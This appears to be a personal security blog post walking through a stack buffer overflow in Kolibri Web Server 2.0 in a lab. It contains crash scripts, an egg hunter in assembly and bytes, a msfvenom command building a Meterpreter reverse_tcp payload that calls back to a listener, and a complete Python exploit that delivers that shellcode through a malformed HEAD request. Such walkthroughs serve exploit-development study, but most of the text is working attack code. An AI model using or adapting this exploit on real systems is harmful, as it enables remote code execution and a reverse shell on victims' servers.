---
layout:     post
title:      Kolibri Web Server 2.0 - GET Stack Buffer Overflow
author:     wooy0ung
tags:       egg hunter
category:   exploit
---

- Ŀ¼
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows XP Pro sp3  
>host machine: Windows 10  
>vulnerability application: Kolibri Web Server 2.0  
<!-- more -->


## 0x001 Test POC

Create pattern string.
```
λ python pattern.py create 600
```

poc.py
```
#!/usr/bin/python
# -*- coding:utf8 -*-

import socket
 
buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
buffer = (
"HEAD /" + buf + " HTTP/1.1\r\n"
"Host: 192.168.0.195:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
expl.connect(("192.168.1.130",8080));
expl.send(buffer);
expl.close();
```

Execute this script on host machine, and the app crashed.
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x001.png)

Lets figure out the offsets to EIP and ESP.(offset 515)
```
!mona findmsp
```
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x002.png)

Try to find out some gadget for redericting to the stack, I choose this one 0x7D5A318B.
```
!mona jmp -r esp
```
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x003.png)

Now, the buf should be......
```
buf = 'A'*515
buf += struct.pack('<L',0x7D5A318B)
buf = buf.ljust(600,'B')
```
It stoped at "jmp esp".


## 0x002 How to Exploit it?

We will be using a slightly modified version of one of these egg hunters, you can see it's structure below.
```
loop_inc_page:
	or    dx, 0x0fff                    // Add PAGE_SIZE-1 to edx
loop_inc_one:
	inc   edx                           // Increment our pointer by one
loop_check:
	push  edx                           // Save edx
	push  0x2                           // Push NtAccessCheckAndAuditAlarm
	pop   eax                           // Pop into eax
	int   0x2e                          // Perform the syscall
	cmp   al, 0x05                      // Did we get 0xc0000005 (ACCESS_VIOLATION) ?
	pop   edx                           // Restore edx
loop_check_8_valid: 
	je    loop_inc_page                 // Yes, invalid ptr, go to the next page

is_egg:
	mov   eax, 0x50905090               // Throw our egg in eax
	mov   edi, edx                      // Set edi to the pointer we validated
	scasd                               // Compare the dword in edi to eax
	jnz   loop_inc_one                  // No match? Increment the pointer by one
	scasd                               // Compare the dword in edi to eax again (which is now edx + 4)
	jnz   loop_inc_one                  // No match? Increment the pointer by one

matched:
	jmp   edi                           // Found the egg.  Jump 8 bytes past it into our code.
```

I recommend you to asmbly these code by referencing this website.  
[[Online x86 / x64 Assembler and Disassembler]](https://defuse.ca/online-x86-assembler.htm)

Now, our buf should be......
```
hunter = (
"\x66\x81\xCA\xFF"
"\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E"
"\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x6f"
"\x6f\x79\x89\xD7"
"\xAF\x75\xEA\xAF"
"\x75\xE7\xFF\xE7")

buf = 'A'*478 + hunter + 'A'*5
buf += struct.pack('<L',0x7D5A318B)
buf += "\xEB\xC4"
```
The Egg label is "wooy".

It's time for us to organize our shellcode. Create enough pattern string, and set a bp at our gadget. Execute this script!
```
#!/usr/bin/python
# -*- coding:utf8 -*-

import socket,struct

shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

hunter = (
"\x66\x81\xCA\xFF"
"\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E"
"\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x6f"
"\x6f\x79\x89\xD7"
"\xAF\x75\xEA\xAF"
"\x75\xE7\xFF\xE7")

buff = 'A'*478 + hunter + 'A'*5
buff += struct.pack('<L',0x7D5A318B)
buff += "\xEB\xC4"

buffer = (
"HEAD /" + buff + " HTTP/1.1\r\n"
"Host: 192.168.0.195:8080\r\n"
"User-Agent: " + shellcode + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
expl.connect(("192.168.1.130",8080));
expl.send(buffer);
expl.close();
```
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x004.png)

Now, we may confirm our shellcode is truly exisit.
```
!mona findmsp
```
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x005.png)


## 0x003 Exploit it!

Generate payload~
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.195 LPORT=9000 -b '\x00\x0d\x0a\x3d\x20\x3f' -f python

buf =  ""
buf += "\xbe\x38\x24\x2d\xb8\xd9\xf7\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x56\x83\xc3\x04\x31\x73\x0f\x03\x73\x37\xc6"
buf += "\xd8\x44\xaf\x84\x23\xb5\x2f\xe9\xaa\x50\x1e\x29\xc8"
buf += "\x11\x30\x99\x9a\x74\xbc\x52\xce\x6c\x37\x16\xc7\x83"
buf += "\xf0\x9d\x31\xad\x01\x8d\x02\xac\x81\xcc\x56\x0e\xb8"
buf += "\x1e\xab\x4f\xfd\x43\x46\x1d\x56\x0f\xf5\xb2\xd3\x45"
buf += "\xc6\x39\xaf\x48\x4e\xdd\x67\x6a\x7f\x70\xfc\x35\x5f"
buf += "\x72\xd1\x4d\xd6\x6c\x36\x6b\xa0\x07\x8c\x07\x33\xce"
buf += "\xdd\xe8\x98\x2f\xd2\x1a\xe0\x68\xd4\xc4\x97\x80\x27"
buf += "\x78\xa0\x56\x5a\xa6\x25\x4d\xfc\x2d\x9d\xa9\xfd\xe2"
buf += "\x78\x39\xf1\x4f\x0e\x65\x15\x51\xc3\x1d\x21\xda\xe2"
buf += "\xf1\xa0\x98\xc0\xd5\xe9\x7b\x68\x4f\x57\x2d\x95\x8f"
buf += "\x38\x92\x33\xdb\xd4\xc7\x49\x86\xb0\x24\x60\x39\x40"
buf += "\x23\xf3\x4a\x72\xec\xaf\xc4\x3e\x65\x76\x12\x37\x61"
buf += "\x89\xcc\xff\xe2\x77\xed\xff\x2b\xbc\xb9\xaf\x43\x15"
buf += "\xc2\x24\x94\x9a\x17\xd0\x9e\x0c\x58\x8c\x9e\x4e\x30"
buf += "\xce\xa0\x6d\xe9\x47\x46\x21\xb9\x07\xd7\x82\x69\xe7"
buf += "\x87\x6a\x60\xe8\xf8\x8b\x8b\x23\x91\x26\x64\x9d\xc9"
buf += "\xde\x1d\x84\x82\x7f\xe1\x13\xef\x40\x69\x91\x0f\x0e"
buf += "\x9a\xd0\x03\x67\xfd\x1a\xdc\x78\x68\x1a\xb6\x7c\x3a"
buf += "\x4d\x2e\x7f\x1b\xb9\xf1\x80\x4e\xba\xf6\x7f\x0f\x8a"
buf += "\x8d\xb6\x85\xb2\xf9\xb6\x49\x32\xfa\xe0\x03\x32\x92"
buf += "\x54\x70\x61\x87\x9a\xad\x16\x14\x0f\x4e\x4e\xc8\x98"
buf += "\x26\x6c\x37\xee\xe8\x8f\x12\x6c\xee\x6f\xe0\x5b\x57"
buf += "\x07\x1a\xdc\x67\xd7\x70\xdc\x37\xbf\x8f\xf3\xb8\x0f"
buf += "\x6f\xde\x90\x07\xfa\x8f\x53\xb6\xfb\x85\x32\x66\xfb"
buf += "\x2a\xef\x99\x86\x43\x10\x5a\x77\x4a\x75\x5b\x77\x72"
buf += "\x8b\x60\xa1\x4b\xf9\xa7\x71\xe8\xf2\x92\xd4\x59\x99"
buf += "\xdc\x4b\x99\x88"
```

Win~
```
#!/usr/bin/python
# -*- coding:utf8 -*-

import socket,struct

buf =  ""
buf += "\xdb\xc9\xbb\xab\xa2\x2f\xb8\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\xbf\x40"
buf += "\xda\x44\x57\x06\x25\xb5\xa7\x67\xaf\x50\x96\xa7\xcb"
buf += "\x11\x88\x17\x9f\x74\x24\xd3\xcd\x6c\xbf\x91\xd9\x83"
buf += "\x08\x1f\x3c\xad\x89\x0c\x7c\xac\x09\x4f\x51\x0e\x30"
buf += "\x80\xa4\x4f\x75\xfd\x45\x1d\x2e\x89\xf8\xb2\x5b\xc7"
buf += "\xc0\x39\x17\xc9\x40\xdd\xef\xe8\x61\x70\x64\xb3\xa1"
buf += "\x72\xa9\xcf\xeb\x6c\xae\xea\xa2\x07\x04\x80\x34\xce"
buf += "\x55\x69\x9a\x2f\x5a\x98\xe2\x68\x5c\x43\x91\x80\x9f"
buf += "\xfe\xa2\x56\xe2\x24\x26\x4d\x44\xae\x90\xa9\x75\x63"
buf += "\x46\x39\x79\xc8\x0c\x65\x9d\xcf\xc1\x1d\x99\x44\xe4"
buf += "\xf1\x28\x1e\xc3\xd5\x71\xc4\x6a\x4f\xdf\xab\x93\x8f"
buf += "\x80\x14\x36\xdb\x2c\x40\x4b\x86\x38\xa5\x66\x39\xb8"
buf += "\xa1\xf1\x4a\x8a\x6e\xaa\xc4\xa6\xe7\x74\x12\xbf\xe0"
buf += "\x86\xcc\x07\x60\x79\xed\x77\xa8\xbe\xb9\x27\xc2\x17"
buf += "\xc2\xac\x12\x97\x17\x58\x19\x0f\x58\x34\x1d\x0c\x30"
buf += "\x46\x1e\xb1\xe9\xcf\xf8\xe5\xb9\x9f\x54\x46\x6a\x5f"
buf += "\x05\x2e\x60\x50\x7a\x4e\x8b\xbb\x13\xe5\x64\x15\x4b"
buf += "\x92\x1d\x3c\x07\x03\xe1\xeb\x6d\x03\x69\x19\x91\xca"
buf += "\x9a\x68\x81\x3b\xfd\x92\x59\xbc\x68\x92\x33\xb8\x3a"
buf += "\xc5\xab\xc2\x1b\x21\x74\x3c\x4e\x32\x73\xc2\x0f\x02"
buf += "\x0f\xf5\x85\x2a\x67\xfa\x49\xaa\x77\xac\x03\xaa\x1f"
buf += "\x08\x70\xf9\x3a\x57\xad\x6e\x97\xc2\x4e\xc6\x4b\x44"
buf += "\x27\xe4\xb2\xa2\xe8\x17\x91\xb0\xef\xe7\x67\x9f\x57"
buf += "\x8f\x97\x9f\x67\x4f\xf2\x1f\x38\x27\x09\x0f\xb7\x87"
buf += "\xf2\x9a\x90\x8f\x79\x4b\x52\x2e\x7d\x46\x32\xee\x7e"
buf += "\x65\xef\x01\x04\x06\x10\xe2\xf9\x0e\x75\xe3\xf9\x2e"
buf += "\x8b\xd8\x2f\x17\xf9\x1f\xec\x2c\xf2\x2a\x51\x04\x99"
buf += "\x54\xc5\x56\x88"

shellcode = "wooywooy" + buf

hunter = (
"\x66\x81\xCA\xFF"
"\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E"
"\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x6f"
"\x6f\x79\x89\xD7"
"\xAF\x75\xEA\xAF"
"\x75\xE7\xFF\xE7")

buff = 'A'*478 + hunter + 'A'*5
buff += struct.pack('<L',0x7D5A318B)
buff += "\xEB\xC4"

buffer = (
"HEAD /" + buff + " HTTP/1.1\r\n"
"Host: 192.168.1.130:8080\r\n"
"User-Agent: " + shellcode + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
expl.connect(("192.168.1.130",8080));
expl.send(buffer);
expl.close();
```
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x006.png)
![](/assets/img/exploit/2018-08-13-kolibri-web-server-2.0-get-stack-buffer-overflow/0x007.png)